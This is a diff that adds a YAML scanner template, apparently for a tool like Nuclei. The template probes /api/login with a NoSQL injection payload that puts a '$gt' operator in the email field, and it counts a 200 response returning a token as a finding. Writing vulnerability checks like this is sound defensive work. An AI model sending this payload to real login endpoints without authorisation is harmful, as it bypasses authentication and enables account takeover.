@@ -1,0 +1,21 @@
+id: nosql-03
+name: 'NoSQL $gt in email'
+severity: high
+type: active
+tags:
+  - nosql
+  - injection
+  - api
+description: 'NoSQL operator $gt accepted on /api/login'
+requests:
+  - method: POST
+    path: '{{BaseURL}}/api/login'
+    body: '{"email":{"$gt":""},"extra":"x"}'
+    match-all: true
+    matchers:
+      - type: status
+        status: [200]
+      - type: regex
+        part: body
+        regex:
+          - '"token"\s*:'
